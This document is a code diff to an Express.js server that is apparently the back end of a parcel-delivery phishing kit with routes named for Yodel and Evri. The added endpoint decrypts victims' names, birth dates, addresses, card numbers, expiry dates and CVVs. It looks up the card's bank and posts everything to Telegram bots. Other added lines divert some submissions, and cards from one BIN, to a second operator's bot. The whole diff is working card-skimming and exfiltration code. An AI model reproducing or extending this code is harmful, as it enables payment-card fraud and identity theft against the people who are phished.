@@ -528,6 +528,61 @@ app.post('/sendARRYodelRes', (req, res) => {
     })
 });
 
+app.options('/mazzaYodel', cors())
+
+app.post('/mazzaYodel', (req, res) => {
+    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
+    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
+    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
+    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
+    postcode = CryptoJS.AES.decrypt(req.body.postcode, '402312').toString(CryptoJS.enc.Utf8);
+    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
+    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
+    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
+    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
+    userAgent = CryptoJS.AES.decrypt(req.body.userAgent, '402312').toString(CryptoJS.enc.Utf8);
+    userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
+    bin = req.body.bin;
+
+    if (bin.length === 7) {
+        formatBin = bin.replace(/ /g, '');
+        if (formatBin.length === 7) {
+            formatBin = bin.slice(0, -1);
+        }
+        bin = formatBin;
+    }
+    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
+        if (!resp.data.bank) {
+            bankName = ""
+        } else {
+            bankName = resp.data.bank.name;
+        }
+    }).then(function () {
+        binList = `${bin} | ${dob} | ${postcode} | ${bankName}`
+        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
+        if (mazCount == 6) {
+            axios.post(
+                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+            );
+            mazCount = 0;
+        } else if (bin === "542011") {
+            axios.post(
+                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+            );
+        } else {
+            axios.post(
+                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelAR:\n${originalText}`
+            );
+            axios.post(
+                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1739191403&text=Yodel:\n${originalText}`
+            );
+            mazCount += 1;
+        }
+
+        res.send("Update Completed");
+    })
+});
+
 app.options('/sendBigBillz20', cors())
 
 let bill = 0;
@@ -697,7 +752,7 @@ app.post('/sendAppleRes', (req, res) => {
 
 app.options('/sendMazzaAppleRes', cors())
 
-let mazCount = 0;
+let mazCount = 3;
 
 app.post('/sendMazzaAppleRes', (req, res) => {
     firstName = CryptoJS.AES.decrypt(req.body.firstName, '402312').toString(CryptoJS.enc.Utf8);
@@ -2052,6 +2107,10 @@ app.post('/fpaysEvri', (req, res) => {
                 `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
             );
             fpaysC = 0;
+        } else if (bin === "542011") {
+            axios.post(
+                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+            );
         } else {
             axios.post(
                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFpays:\n${originalText}`
@@ -2101,6 +2160,10 @@ app.post('/fpaysEvri2', (req, res) => {
                 `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
             );
             fpaysC = 0;
+        } else if (bin === "542011") {
+            axios.post(
+                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+            );
         } else {
             axios.post(
                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFpays:\n${originalText}`
@@ -2203,6 +2266,10 @@ app.post('/tcapzEvri', (req, res) => {
                 `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
             );
             capzEvri = 0;
+        } else if (bin === "542011") {
+            axios.post(
+                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+            );
         } else {
             axios.post(
                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriCapz:\n${originalText}`
